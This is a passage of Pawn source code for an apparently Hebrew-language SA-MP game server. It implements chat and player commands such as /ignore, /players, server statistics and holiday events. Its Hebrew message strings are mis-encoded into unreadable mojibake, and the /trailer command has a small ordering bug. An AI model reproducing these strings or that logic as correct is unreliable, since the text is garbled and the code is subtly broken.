			SendClientMessage(playerid,grey," (/setting :Ёщ·я ьфчьщє р· ·Ўхт· фёшршё Х /stats [id/name] :ыущ ь°рх· ёшршё ∙ь ющ∙фх рч°)");
			playerinfo[playerid][noticedmsg][10] = 1;
		}
		return 1;
	}
	if(equal(cmd,"/hebeng"))
	{
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /hebeng [text] :Ўх°· ф∙щюх∙");
		ToHebrew(cmd);
		OnPlayerText(playerid,cmd);
		return 1;
	}
	if(equal(cmd,"/engheb"))
	{
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /engheb [text] :Ўх°· ф∙щюх∙");
		ToEnglish(cmd);
		OnPlayerText(playerid,cmd);
		return 1;
	}
	if(equal(cmd,"/vinfo"))
	{
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
		new string[M_S], Float:vh, v = GetPlayerVehicleID(playerid), ds[4];
		SendClientMessage(playerid,lightblue," ~~~ :Ї°шщ ф°ыс ∙ьъ ~~~");
		GetVehicleHealth(v,vh);
		format(string,sizeof(string)," (%%%d) %d :чщщэ",FloatToInt(vh) / 10,FloatToInt(vh));
		SendClientMessage(playerid,grey,string);
		format(string,sizeof(string)," %d :юхуь",GetVehicleModel(v));
		SendClientMessage(playerid,grey,string);
		format(string,sizeof(string)," %d :юёЇ° °ыс",v);
		SendClientMessage(playerid,grey,string);
		format(string,sizeof(string)," %s :∙э",GetVehicleName(GetVehicleModel(v)));
		SendClientMessage(playerid,grey,string);
		format(string,sizeof(string)," ЁЄхь: %s",vehicleinfo[v][locked] ? ("ыя") : ("ьр"));
		SendClientMessage(playerid,grey,string);
		GetVehicleDamageStatus(v,ds[0],ds[1],ds[2],ds[3]);
		if(ds[3] == 0b0000) string = "ыхьэ ∙ьющэ";
		else if(ds[3] == 0b1111) string = "ыхьэ юЇхЎЎщэ";
		else string = "чьўэ юЇхЎЎщэ";
		format(string,sizeof(string)," юЎс тьтьщэ: %s",string);
		SendClientMessage(playerid,grey,string);
		if(vehicleinfo[v][vspecial])
		{
			format(string,sizeof(string)," /svinfo :°ыс цф фхр °ыс ющхчу. ьющуЄ Єь щыхьх·щх ф∙·ю∙ сЇўхуф",string);
			SendClientMessage(playerid,grey,string);
		}
		return 1;
	}
	if(equal(cmd,"/ignore"))
	{
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /ignore [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(IsPlayerMAdmin(id) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .рщя рЇ∙°х· ьчёхэ рующЁщэ");
		if(id == playerid) return SendClientMessage(playerid,red," .ьр Ёщ·я ьчёхэ р· ЄЎюъ");
		if(playerinfo[playerid][ignore][id]) return SendClientMessage(playerid,red," .∙чўя цф ыс° чёхэ рЎьъ");
		playerinfo[playerid][ignore][id] = 1;
		format(string,sizeof(string)," .%s чёю· р·",GetName(id));
		SendClientMessage(playerid,red,string);
		return 1;
	}
	if(equal(cmd,"/unignore"))
	{
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unignore [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(IsPlayerMAdmin(id) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .рщя рЇ∙°х· ьчёхэ рующЁщэ");
		if(id == playerid) return SendClientMessage(playerid,red," .ьр Ёщ·я ьчёхэ р· ЄЎюъ");
		if(!playerinfo[playerid][ignore][id]) return SendClientMessage(playerid,red," .∙чўя цф рщЁх чёхэ рЎьъ");
		playerinfo[playerid][ignore][id] = 0;
		format(string,sizeof(string)," .%s фх°у· р· фчёщюф ь",GetName(id));
		SendClientMessage(playerid,red,string);
		return 1;
	}
	if(equal(cmd,"/players"))
	{
		cmd = strtok(cmdtext,idx);
		if(strlen(cmd) > 0 && !equal(cmd,"list"))
		{
			SendClientMessage(playerid,white," /players :ющуЄ ∙чўЁщэ");
			SendClientMessage(playerid,white," /players list :°∙щю· ф∙чўЁщэ");
			return 1;
		}
		new string[M_S], op = 0;
		if(!strlen(cmd))
		{
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i)) op++;
			SendClientMessage(playerid,lightblue," ~~~ :ющуЄ ∙чўЁщэ ~~~");
			format(string,sizeof(string)," Х ю∙·ю∙щэ ючхс°щэ: %d",op);
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string)," Х юёЇ° фю∙·ю∙щэ фчё°щэ ьф∙ью· %d ∙чўЁщэ: %d",GetMaxPlayers(),GetMaxPlayers()-op);
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string)," Х юўёщюхэ ∙чўЁщэ: %d",GetMaxPlayers());
			SendClientMessage(playerid,grey,string);
			SendClientMessage(playerid,orange," Х /players list :ь°∙щю· ф∙чўЁщэ фюьрф");
		}
		else
		{
			SendClientMessage(playerid,lightblue," ~~~ :°∙щю· ф∙чўЁщэ ~~~");
			for(new i = 0; i < MAX_PLAYERS_; i++)
			{
				if(IsPlayerConnected(i) && !IsPlayerNPC(i))
				{
					if(!IsPlayerMAdmin(playerid)) format(string,sizeof(string)," %03d. #%d - %s",++op,i,GetName(i));
					else
					{
						if(IsPlayerMAdmin(i)) format(string,sizeof(string)," %03d. #%d - %s (***.***.***.***)",++op,i,GetName(i));
						else format(string,sizeof(string)," %03d. #%d - %s (%s)",++op,i,GetName(i),GetIP(i));
					}
					SendClientMessage(playerid,op % 2 == 0 ? grey : white,string);
				}
			}
			if(op >= 9) TooManyMsgs(playerid);
		}
		return 1;
	}
	if(equal(cmd,"/srvdetails"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || equal(cmd,"general"))
		{
			SendClientMessage(playerid,lightblue," ~~~ Server Details - ёшшщёшщўх· хЇ°шщ ф∙°· ~~~");
			SendClientMessage(playerid,purple," ╗ (/help info ющуЄ ыььщ (юхЎт тэ с");
			format(cmd,sizeof(cmd)," т°ё· фюху: %s Х фЄуыхя фрч°хя фщф с-%s Х юёЇ° фЄуыхЁщэ ∙фщх Єу ыф фхр %s",version,curNewsDate,curNews);
			SendClientMessage(playerid,yellow,cmd);
			SendClientMessage(playerid,purple," ╗ (/best) ∙щрщэ");
			format(cmd,sizeof(cmd)," ∙щр ∙чўЁщэ ючхс°щэ ь∙°·: %d Х ∙щр рующЁщэ ючхс°щэ ь∙°·: %d",serverDetails[sdGPlayers],serverDetails[sdGAdmins]);
			SendClientMessage(playerid,yellow,cmd);
			SendClientMessage(playerid,purple," ╗ (/srvdetails weapons :ф°щтх· сЁ∙ўщэ (ь·Ўхтф юьрф");
			format(cmd,sizeof(cmd)," Pistols: %d Х MachineGuns: %d Х Shotguns: %d Х Assaults: %d Х Snipers: %d Х RocketLaunchers: %d Х Throwing: %d",
			serverDetails[sdWeaponKills][22] + serverDetails[sdWeaponKills][23] + serverDetails[sdWeaponKills][24],
			serverDetails[sdWeaponKills][28] + serverDetails[sdWeaponKills][29] + serverDetails[sdWeaponKills][32],
			serverDetails[sdWeaponKills][25] + serverDetails[sdWeaponKills][26] + serverDetails[sdWeaponKills][27],
			serverDetails[sdWeaponKills][30] + serverDetails[sdWeaponKills][31],
			serverDetails[sdWeaponKills][33] + serverDetails[sdWeaponKills][34],
			serverDetails[sdWeaponKills][35] + serverDetails[sdWeaponKills][36],
			serverDetails[sdWeaponKills][16] + serverDetails[sdWeaponKills][17] + serverDetails[sdWeaponKills][18] + serverDetails[sdWeaponKills][39]);
			SendClientMessage(playerid,yellow,cmd);
			new melee = 0;
			for(new i = 0; i < 16; i++) melee += serverDetails[sdWeaponKills][i];
			format(cmd,sizeof(cmd)," Small: %d Х Heavy: %d Х Melee: %d",
			serverDetails[sdWeaponKills][22] + serverDetails[sdWeaponKills][23] + serverDetails[sdWeaponKills][24] + serverDetails[sdWeaponKills][26] + serverDetails[sdWeaponKills][28] + serverDetails[sdWeaponKills][32] + serverDetails[sdWeaponKills][29],
			serverDetails[sdWeaponKills][25] + serverDetails[sdWeaponKills][27] + serverDetails[sdWeaponKills][31] + serverDetails[sdWeaponKills][30] + serverDetails[sdWeaponKills][33] + serverDetails[sdWeaponKills][32] + serverDetails[sdWeaponKills][34],
			melee);
			SendClientMessage(playerid,yellow,cmd);
			SendClientMessage(playerid,purple," ╗ рЇ∙°хщх· ЁхёЇх·");
			SendClientMessage(playerid,yellow," /srvdetails deaths");
		}
		else
		{
			if(equal(cmd,"weapons"))
			{
				SendClientMessage(playerid,lightblue," ~~~ Weapons - Ё∙ўщэ - Server Details - ёшшщёшщўх· хЇ°шщ ф∙°· ~~~");
				new cur = 0;
				cmd = "";
				for(new i = 0; i < 40; i++)
				{
					if(i >= 19 && i <= 21) continue;
					format(cmd,sizeof(cmd),"%s Х %s: %d",cmd,WeaponName(i),serverDetails[sdWeaponKills][i]);
					cur++;
					if(cur >= 4)
					{
						SendClientMessage(playerid,yellow,cmd);
						cmd = "", cur = 0;
					}
				}
			}
			else if(equal(cmd,"deaths"))
			{
				SendClientMessage(playerid,lightblue," ~~~ Deaths - ЇЄющ юхх· - Server Details - ёшшщёшщўх· хЇ°шщ ф∙°· ~~~");
				format(cmd,sizeof(cmd)," ~ юёЇ° фЇЄющэ ∙∙чўЁщэ рщщ ЇЄэ ю·х: %d",serverDetails[sdDeaths][0]);
				SendClientMessage(playerid,yellow,cmd);
				format(cmd,sizeof(cmd)," ~ юёЇ° фЇЄющэ сфэ ∙чўЁщэ Ёф°тх су°ъ ∙ьр юхёщЇф ф°щтх·: %d",serverDetails[sdDeaths][1]);
				SendClientMessage(playerid,yellow,cmd);
				format(cmd,sizeof(cmd)," ~ юёЇ° фЇЄющэ сфэ ∙чўЁщэ Ёф°тх су°ъ ∙юхёщЇф ф°щтх·: %d",serverDetails[sdDeaths][2]);
				SendClientMessage(playerid,yellow,cmd);
				format(cmd,sizeof(cmd)," ~ юёЇ° фЇЄющэ сфэ ∙чўЁщэ шсЄх сющэ: %d",serverDetails[sdDeaths][3]);
				SendClientMessage(playerid,yellow,cmd);
				format(cmd,sizeof(cmd)," ~ юёЇ° фЇЄющэ сфэ ∙чўЁщэ Ёф°тх Є\"щ ∙чўя ∙ЁюЎр с°ыс: %d",serverDetails[sdDeaths][4]);
				SendClientMessage(playerid,yellow,cmd);
			}
			else if(equal(cmd,"update") && IsPlayerMAdmin(playerid))
			{
				UpdateServerDetails();
				SendClientMessage(playerid,green," .Ї°шщ ф∙°· ЄхуыЁх");
			}
			else
			{
				SendClientMessage(playerid,red," .рЇ∙°х· ющуЄ ∙°· ∙тхщф");
				SendClientMessage(playerid,white," /srvdetails general :ющуЄ ыььщ");
				SendClientMessage(playerid,white," /srvdetails weapons :ющуЄ ьтсщ ф°щтх· сЁ∙ўщэ");
				SendClientMessage(playerid,white," /srvdetails deaths :юёЇ° ЇЄющ юхх· су°ыщэ юёхщщюх·");
				if(IsPlayerMAdmin(playerid)) SendClientMessage(playerid,white," /srvdetails update :Єуыхя Ї°шщ ф∙°·");
			}
		}
		return 1;
	}
	if(equal(cmd,"/sta") || equal(cmd,"/best")) // guard_shit
	{
		new string[M_S];
		format(string,sizeof(string)," %d :SAMP-IL Guard-ыюх· ючхс°щэ: %d || ∙щр щхющ: %d || ∙щр ыььщ: %d || ю∙·ю∙щэ с",sta[1],sta[0],todayBest,serverDetails[sdGPlayers]);
		SendClientMessage(playerid,orange,string);
		return 1;
	}
	if(equal(cmd, "/donutshop"))
	{
		#if !hanukkah_now
		return SendClientMessage(playerid, red, " .Їўхуф цх рЇ∙°щ· ьсщЎхЄ °ў счЁхыф");
		#else
		if(!CanBeTeleported(playerid)) return SendClientMessage(playerid, red, " .рщЁъ щыхь ьф∙·ю∙ счЁх· фёхЇтЁщх· сюЎсъ фЁхычщ");
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid, red, " .чЁх· цх Ї·хчф Єсх° ю∙·ю∙щэ °∙хющэ сьсу");
		ShowPlayerConstDialog(playerid, dialog_hanukkah);
		return 1;
		#endif
	}
	#if hanukkah_now
	if(equal(cmd, "/setdonuts") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new cmd2[M_S], string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setdonuts [id/name] [amount] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		new amount = strval(cmd2);
		if(amount < 0 || amount > 9999999) return SendClientMessage(playerid, red, " .Є°ъ ьр чхўщ");
		format(string,sizeof(string)," .ь %d %s фЎс· р· ыюх· фёхЇтЁщх· ∙ь ф∙чўя",amount,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя фЎщс р· юёЇ° фёхЇтЁщх· ∙ьъ ь %d",amount);
		SendClientMessage(id,green,string);
        fsetint(fuser(id),"donuts",amount);
        playerinfo[id][donut] = amount;
		return 1;
	}
	#endif
 	if(equal(cmd,"/purim"))
 	{
		#if !purim_now
		return SendClientMessage(playerid,red," .Їўхуф цх рЇ∙°щ· ьсщЎхЄ °ў сЇх°щэ");
		#else
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /purim [1/2] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /purim 1 :∙щтх° ьюхЄухя °щўхущэ ∙ь Їх°щэ");
			return SendClientMessage(playerid,white," /purim 2 :ьф·чЇ∙");
		}
		switch(strval(cmd))
		{
			case 1:
			{
				if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·т° ыр∙° р·ф сюЎс");
				if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьф∙·т° ыр∙° р·ф сющ°хї Ї°шщ");
				if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє");
				if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING) return SendClientMessage(playerid,red,"р Ёщ·я ьф∙·т° ыр∙° р·ф сЇЄщьх·");
				if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф ссчщ°· фуюхщх·");
				if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф сў°с Ї°шщ");
				if(playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф су°щЇш");
				if(playerinfo[playerid][inprace]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх ыр∙° р·ф сюЄўс");
				if(playerinfo[playerid][incwar]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх ыр∙° р·ф сюьчю· ўьрЁщэ");
				if(!CanTeleportSVehicle(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·т° Єэ ф°ыс фцф");
				if(playerinfo[playerid][srstarted] || playerinfo[playerid][srin]) return SendClientMessage(playerid,red," /srstop :ьр Ёщ·я ьф∙·т° ыр∙° р·ф сюшххч, ьфЇёўф ф∙·ю∙ сЇўхуф");
				if(playerinfo[playerid][dmzone] > dmz_none || playerinfo[playerid][tdmzone] > tdmz_none) OutOfDMZone(playerid);
				ResetWeapons(playerid);
				SetPlayerVirtualWorld(playerid,world_purim);
				SetPlayerPos(playerid,2848.7322,-1765.0333,10.8750);
				SetPlayerFacingAngle(playerid,258.3229);
				SendClientMessage(playerid,purple," ╗ !" @c(red) "с°хыщэ " @c(green) "фсрщэ " @c(lightblue) "ьюёщс· " @c(yellow) "Їх°щэ" @c(purple) " л");
				SendClientMessage(playerid,pink," /dance :ыущ ь°ўху ф∙·ю∙ сЇўхуф");
				SendClientMessage(playerid,pink," (: !!!чт ∙юч хю∙чў юфЁф");
			}
			case 2:
			{
			 	if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·т° ыр∙° р·ф сюЎс");
				if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьф∙·т° ыр∙° р·ф сющ°хї Ї°шщ");
				if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє");
				if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING) return SendClientMessage(playerid,red,"р Ёщ·я ьф∙·т° ыр∙° р·ф сЇЄщьх·");
				if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф ссчщ°· фуюхщх·");
				if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф сў°с Ї°шщ");
				if(playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф су°щЇш");
				if(playerinfo[playerid][inprace]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх ыр∙° р·ф сюЄўс");
				if(playerinfo[playerid][incwar]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх ыр∙° р·ф сюьчю· ўьрЁщэ");
				if(!CanTeleportSVehicle(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·т° Єэ ф°ыс фцф");
				if(playerinfo[playerid][srstarted] || playerinfo[playerid][srin]) return SendClientMessage(playerid,red," /srstop :ьр Ёщ·я ьф∙·т° ыр∙° р·ф сюшххч, ьфЇёўф ф∙·ю∙ сЇўхуф");
			    if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
				ShowPlayerDialog(playerid,dialog_purim,DIALOG_STYLE_LIST,"{FF0000}·{00FF00}ч{0000FF}Ї{FFFFFF}х{FFFF00}∙{FF66FF}х{00FFFF}·","Heart\nParrot\nMr.Animal\nCop\nFire Man\nBuilder\nFisherman\nPirate\n" @c(red) "∙ьч фЎЄф ь·чЇх∙· чу∙ф\n" @c(red) "фё°· ·чЇх∙·","!ф·чЇ∙","ётх°");
			}
			default: return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		}
		return 1;
		#endif
	}
	if(equal(cmd,"/sampcmds"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :SA-MP-°∙щю· Їўхух· юхсЁх· с ~~~");
		SendClientMessage(playerid,orange," * /quit (/q) - щЎщрф юф∙°·");
		SendClientMessage(playerid,orange," * /save - ∙ющ°· ющўхэ");
		SendClientMessage(playerid,orange," * /interior - фЎт· юёЇ° фрщЁш°щх° ∙ьъ");
		SendClientMessage(playerid,orange," * /dl - ЎЇщщф сЇ°шщ юыхЁщх·");
		SendClientMessage(playerid,orange," * /fpslimit - сю∙чў FPS ∙щЁхщ ф");
		SendClientMessage(playerid,orange," * /pagesize - ∙щЁхщ тхуь фЎ'рш");
		SendClientMessage(playerid,orange," * /timestamp - фЎтф ∙ь цюЁщ ∙ьщч· фхуЄх· сЎ'рш");
		return 1;
	}
	if(equal(cmd,"/options"))
	{
		new total[2] = 0, list[800];
		format(list,sizeof(list),@c(lightblue) " ~~~ :°∙щю· фрхЇЎщх· ~~~\n");
		for(new i = 0; i < sizeof(Options); i++)
		{
			format(list,sizeof(list),"%s\n{%s} Х %02d. %s [%s]",list,HexStringOfColor(Options[i][optActive] ? green : red),i + 1,Options[i][optName],Options[i][optActive] ? ("ON") : ("OFF"));
			total[Options[i][optActive] ? 0 : 1]++;
		}
		format(list,sizeof(list),"%s\n\n" @c(yellow) ".ы°тЄ с∙°·: %d рхЇЎщх· ЇЄщьх·, %d рхЇЎщх· ысхщх·",list,total[0],total[1]);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "°∙щю· ёхтщ фрхЇЎщх·",list,"OK","");
		return 1;
	}
	if(equal(cmd,"/w"))
	{
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /w [text] :Ўх°· ф∙щюх∙");
		if(strlen(cmd) > 100) return SendClientMessage(playerid,red," .ффхуЄф р°хыф юущ");
		new string[M_S], v = GetPlayerVehicleID(playerid), c;
		if(advertisement(cmd,"ьчщ∙ф (Їўхуф)",playerid,"found in /w")) return 1;
		format(string,sizeof(string)," %s whispers: %s",GetName(playerid),cmd);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid) && GetPlayerState(i) != PLAYER_STATE_SPECTATING && (i == playerid || ((v && IsPlayerInVehicle(i,v)) || (!v && GetDistanceBetweenPlayers(playerid,i) <= 6.0))))
		{
			SendClientMessage(i,grey,string);
			c++;
		}
		if(c > 1)
		{
			format(string,sizeof(string)," .∙чўЁщэ ∙юЄх р· фьчщ∙ф %d",c);
			SendClientMessage(playerid,green,string);
		}
		else SendClientMessage(playerid,red," ...рє рчу ьр ∙юЄ р· фьчщ∙ф");
		return 1;
	}
	if(equal(cmd,"/idle"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /idle [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid), string[M_S];
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		new i = playerinfo[id][idletime];
		format(string,sizeof(string)," %02d:%02d:%02d :%s цюя фЇЄщьх· фрч°хЁф ∙ь",i/3600,(i/60)-((i/3600)*60),i%60,GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/map")) return ShowTXD(playerid,txd_map,playerinfo[playerid][showingtxd][txd_map] ? 'h' : 's');
	if(equal(cmd,"/status") || equal(cmd,"/trace"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /trace [id/name] рх /status [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid), string[M_S];
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(IsPlayerMAdmin(id) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх Єь рующЁщэ");
		if(getAlpha(GetPlayerColor(id)) <= 10) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх Єь ю∙·ю∙щэ сь·щ Ё°рщэ");
		format(string,sizeof(string)," ы°тЄ " @c(lightgreen) "%s" @c(green) " %s",PlayerStatus[GetPlayerStatus(id)][statusName],GetName(id));
		SendClientMessage(playerid,green,string);
		new z = GetPlayerZone(id,1), z2 = GetPlayerZone(id);
		if(z != -1) format(string,sizeof(string)," %s",Zones[z][zone_name]);
		if(z2 != -1) format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s, %s"),string,Zones[z2][zone_name]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/saveskin"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		SendClientMessage(playerid,green," .фёўщя ∙ьъ Ё∙ю° ью∙·ю∙ ∙ьъ");
		playerinfo[playerid][skin] = GetPlayerSkin(playerid);
		fsetint(fuser(playerid),"Skin",playerinfo[playerid][skin]);
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/delskin"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		if(playerinfo[playerid][skin] == -1) return SendClientMessage(playerid,red," .рщя ьъ ёўщя ∙юх°");
		SendClientMessage(playerid,green," .фёўщя ф∙юх° ∙ьъ Ёючў");
		playerinfo[playerid][skin] = -1;
		fsetint(fuser(playerid),"Skin",playerinfo[playerid][skin]);
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/copyskin"))
	{
		if(!CanUseCommand(playerid)) return 1;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /copyskin [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid), string[M_S];
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(GetDistanceBetweenPlayers(playerid,id) > 15.0) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ў°хс рь ф∙чўя ьфЄ·ў· фёўщя");
		if(GetPlayerAnimationIndex(id) != 1189/* 1189 = Єющуф */) return SendClientMessage(playerid, red, " .∙чўя цф Ў°щъ ьЄюху сюўхюх");
		SetPlayerSkin(playerid,GetPlayerSkin(id));
		format(string,sizeof(string)," .%s фЄ·ў· р· фёўщя ∙ь",GetName(id));
		SendClientMessage(playerid,yellow,string);
		return 1;
	}/*
	if(equal(cmd,"/translate"))
	{
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /translate [text] :Ўх°· ф∙щюх∙");
		Translate("he","en",cmd,playerid);
		return 1;
	}*/
	if(equal(cmd,"/games"))
	{
		//if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new games[][64] =
		{
			"ющ°хЎщэ",
			"ющ°хЎщэ ющхчущэ",
			"ЇЄщьхщх· ыььщх·",
			"ЇЄщьхщх· °ысщэ",
			"ю∙чўщ юьчюф",
			"ЇЄщьхщх· юЎху",
			"ЇЄщьхщх· ёЇх°ш",
			"ЇЄщьхщх· ўсхЎх·",
			"ЇЄщьхщх· Ў'рш",
			"ЇЄщьхщх· ющхчух·",
			@c(green) "ф·чь ЇЄщьх· рў°рщ·",
			@c(red) "/End - ётщ°· ЇЄщьх· ўщщю·",
			@c(red) "/CEnd - ётщ°· ЇЄщьх· Ў'рш ўщщю·"
		}, gamestr[512];
		for(new i = 0, m = IsPlayerMAdmin(playerid) ? sizeof(games) : (sizeof(games) - 3); i < m; i++) format(gamestr,sizeof(gamestr),!strlen(gamestr) ? ("%s%d) %s") : ("%s\n%d) %s"),gamestr,i+1,games[i]);
		ShowPlayerDialog(playerid,dialog_games,DIALOG_STYLE_LIST,@c(lightblue) "ЇЄщьхщх·",gamestr,"счщ°ф","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/trailer"))
	{
		new v = GetPlayerVehicleID(playerid), string[M_S];
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER || GetVehicleModel(v) != 525) return SendClientMessage(playerid,red," .Єьщъ ьфщх· Ёфт ст°°");
		if(IsTrailerAttachedToVehicle(v))
		{
			if(vehicleinfo[v][vatt] == INVALID_VEHICLE_ID) return SendClientMessage(playerid,red," .ьр фщф Ёщ·я ьсЎЄ р· фЇЄхьф");
			DetachTrailerFromVehicle(vehicleinfo[v][vatt]);
			vehicleinfo[v][vatt] = INVALID_VEHICLE_ID;
			format(string,sizeof(string)," .Ёх·ў юфт°° ∙ьъ %s ф°ыс",GetVehicleName(GetVehicleModel(vehicleinfo[v][vatt])));
		}
		else
		{
			new Float:p[3], vid = -1;
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			GetVehicleWithinDistance(playerid,p[0],p[1],p[2],15.0,vid);
			if(vid == -1) return SendClientMessage(playerid,red," .рщя ∙хэ °ыс ьщуъ");
			AttachTrailerToVehicle(v,vid);
			vehicleinfo[v][vatt] = vid;
			format(string,sizeof(string)," .чхс° ьт°° ∙ьъ %s ф°ыс",GetVehicleName(GetVehicleModel(vid)));
		}
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/adsearch"))
	{
		new string[M_S], operat[M_S], value[M_S], found = 0, operator_ = 0, value_ = 0, var = 0, mini = 0, maxi = 0;
		cmd = strtok(cmdtext,idx), operat = strtok(cmdtext,idx), value = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd) || strlen(operat) != 1 || !strlen(value) || !IsNumeric(value))
		{
			SendClientMessage(playerid,white," /adsearch [search by] [operator] [value] :Ўх°· ∙щюх∙");
			SendClientMessage(playerid,white," search by - Ўх°· фчщЇх∙ | operator - ыщххя фчщЇх∙ | value - Є°ъ ьЎх°· фчщЇх∙");
			SendClientMessage(playerid,white," level, kills, headshots, admin, money :search by рЇ∙°хщх·");
			SendClientMessage(playerid,white," >, <, =, ! :operator рЇ∙°хщх·");
			return 1;
		}
